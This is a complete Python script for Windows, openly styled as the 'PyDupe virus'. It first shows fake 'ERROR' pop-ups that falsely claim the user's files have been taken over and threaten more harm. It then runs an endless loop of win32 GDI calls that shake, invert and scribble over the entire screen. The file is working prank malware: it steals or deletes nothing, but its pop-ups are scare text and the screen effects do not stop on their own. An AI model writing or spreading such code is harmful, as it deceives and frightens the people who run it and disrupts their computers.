import time
import tkinter as tk
from tkinter import messagebox
import random
from win32api import *
from win32con import *
from win32gui import *

def show_message_box(message):
    messagebox.showinfo("ERROR", message)

# Create the main window
root = tk.Tk()
root.withdraw()  # Hide the main window

# Show the first message box
show_message_box("Congratulations! You've just been visited by the PyDupe virus. Consider this a digital handshake. Your files are now my playground, and your security is but a distant memory. No need to panic; I won't erase everything... yet. Just a friendly reminder that your defenses were not as good as you thought. Keep an eye on your digital life; you never know where I might pop up next. Best, PyDupe")
time.sleep(1.5)
# Show the second message box
show_message_box("Tick-tock, tick-tock. I hope you've enjoyed our little introduction. It's time to brace yourself for what comes next. My digital tendrils are spreading, and your files are dancing to my tune. You might want to double-check your security; it's about to glitch and groan under the pressure. This is your last chance to beef up those defenses because once the glitch hits, there's no turning back. Prepare yourself, PyDupe")

# Now, you can add your additional code here

while True:
    w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
    BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), w, h, hdc, 0, 0, SRCCOPY)
    BitBlt(hdc, 0, 0, w, h, hdc, random.randint(-10, 10), random.randint(-10, 10), SRCCOPY)
    ReleaseDC(0, hdc)
    w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
    p = [(random.randint(0, w), random.randint(0, h)), (random.randint(0, w), random.randint(0, h)), (random.randint(0, w), random.randint(0, h)), (random.randint(0, w), random.randint(0, h))]
    color = RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
    hPen = CreatePen(PS_SOLID, 5, color)
    SelectObject(hdc, hPen)
    PolyBezier(hdc, p)
    DeleteObject(hPen)
    ReleaseDC(0, hdc)
    w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
    hdcDest = CreateCompatibleDC(hdc)
    hBitmap = CreateCompatibleBitmap(hdc, w, h)
    SelectObject(hdcDest, hBitmap)
    hBrush = CreateSolidBrush(RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))
    SelectObject(hdcDest, hBrush)
    Rectangle(hdcDest, 0, 0, w, h)
    BitBlt(hdc, 0, 0, w, h, hdcDest, 0, 0, SRCINVERT)
    DeleteObject(hBitmap)
    DeleteObject(hBrush)
    DeleteDC(hdcDest)
    ReleaseDC(0, hdc)
    w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
    BitBlt(hdc, random.randint(0, 2), random.randint(0, 2), w, h, hdc, random.randint(0, 2), random.randint(0, 2), SRCPAINT)
    time.sleep(0.08)
    ReleaseDC(0, hdc)
    w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
    PatBlt(hdc, 0, 0, w, h, PATINVERT)
    time.sleep(0.1)
    ReleaseDC(0, hdc)
